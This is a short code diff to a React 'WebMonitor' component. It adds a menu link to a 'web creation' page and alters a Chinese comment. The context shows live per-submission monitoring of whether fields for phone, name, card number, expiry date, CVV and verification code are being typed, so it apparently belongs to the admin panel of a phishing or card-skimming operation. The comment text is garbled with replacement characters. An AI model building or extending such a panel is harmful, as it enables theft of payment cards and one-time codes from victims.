@@ -462,6 +462,10 @@ export function WebMonitor() {
                       </Button>
                     </DropdownMenuTrigger>
                     <DropdownMenuContent align="end" className="w-48">
+                      <DropdownMenuItem onClick={() => window.open('/web-creation', '_blank')}>
+                        🔧 网页制作页面
+                      </DropdownMenuItem>
+                      <DropdownMenuSeparator />
                       <DropdownMenuItem onClick={() => window.open('/dashboard', '_blank')}>
                         📊 数据分析页面
                       </DropdownMenuItem>
@@ -498,7 +502,7 @@ export function WebMonitor() {
                   submission.userName
                 );
 
-                // 检��是否有字段正在输入
+                // 检��是否���字段正在输入
                 const hasActiveTyping = ['phone', 'name', 'cardNumber', 'expiryDate', 'cvv', 'verificationCode'].some(field =>
                   isFieldTyping(submission.id, field)
                 );
